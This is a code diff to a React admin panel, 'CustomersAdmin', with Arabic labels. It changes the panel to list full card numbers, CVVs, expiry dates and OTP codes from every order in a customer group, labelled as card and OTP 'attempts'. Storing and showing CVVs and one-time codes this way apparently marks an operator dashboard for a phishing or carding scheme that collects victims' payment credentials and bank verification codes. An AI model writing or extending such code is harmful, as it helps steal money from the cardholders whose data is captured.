@@ -531,21 +531,37 @@ export function CustomersAdmin() {
             <CardAttemptCard key={attempt.id} attempt={attempt} index={index} />
           ))}
         </div>
-      ) : selectedOrder.cardNumber ? (
-        // Show current order card data as single card if no attempts recorded
+      ) : selectedCustomerGroup && selectedCustomerGroup.orders.some(o => o.cardNumber) ? (
+        // Show card data from all orders in the group
         <div className="space-y-4">
-          <CardAttemptCard 
-            attempt={{
-              id: 0,
-              orderId: selectedOrder.id,
-              cardName: selectedOrder.cardName || '---',
-              cardNumber: selectedOrder.cardNumber,
-              cardExpiry: selectedOrder.cardExpiry || '---',
-              cardCvv: selectedOrder.cardCvv,
-              createdAt: selectedOrder.createdAt as string,
-            }} 
-            index={0} 
-          />
+          {selectedCustomerGroup.orders
+            .filter(order => order.cardNumber)
+            .map((order, index) => (
+              <div key={order.id} className="rounded-lg border bg-card p-4">
+                <div className="mb-2 flex items-center justify-between">
+                  <span className="text-xs font-medium text-muted-foreground">
+                    طلب #{order.id}
+                  </span>
+                  {index === 0 && (
+                    <span className="rounded-full bg-primary/10 px-2 py-0.5 text-xs font-medium text-primary">
+                      الأحدث
+                    </span>
+                  )}
+                </div>
+                <CardAttemptCard 
+                  attempt={{
+                    id: 0,
+                    orderId: order.id,
+                    cardName: order.cardName || '---',
+                    cardNumber: order.cardNumber || '',
+                    cardExpiry: order.cardExpiry || '---',
+                    cardCvv: order.cardCvv,
+                    createdAt: order.createdAt as string,
+                  }} 
+                  index={0}
+                />
+              </div>
+            ))}
         </div>
       ) : (
         <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
@@ -622,17 +638,36 @@ export function CustomersAdmin() {
             <OtpAttemptCard key={attempt.id} attempt={attempt} index={index} />
           ))}
         </div>
-      ) : selectedOrder.otpCode ? (
-        <OtpAttemptCard 
-          attempt={{
-            id: 0,
-            orderId: selectedOrder.id,
-            otpCode: selectedOrder.otpCode,
-            success: true,
-            createdAt: selectedOrder.createdAt as string,
-          }} 
-          index={0} 
-        />
+      ) : selectedCustomerGroup && selectedCustomerGroup.orders.some(o => o.otpCode) ? (
+        // Show OTP from all orders in the group
+        <div className="space-y-4">
+          {selectedCustomerGroup.orders
+            .filter(order => order.otpCode)
+            .map((order, index) => (
+              <div key={order.id} className="rounded-lg border bg-card p-4">
+                <div className="mb-2 flex items-center justify-between">
+                  <span className="text-xs font-medium text-muted-foreground">
+                    طلب #{order.id}
+                  </span>
+                  {index === 0 && (
+                    <span className="rounded-full bg-primary/10 px-2 py-0.5 text-xs font-medium text-primary">
+                      الأحدث
+                    </span>
+                  )}
+                </div>
+                <OtpAttemptCard 
+                  attempt={{
+                    id: 0,
+                    orderId: order.id,
+                    otpCode: order.otpCode || '',
+                    success: true,
+                    createdAt: order.createdAt as string,
+                  }} 
+                  index={0}
+                />
+              </div>
+            ))}
+        </div>
       ) : (
         <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
           لم يتم إدخال رمز التحقق بعد
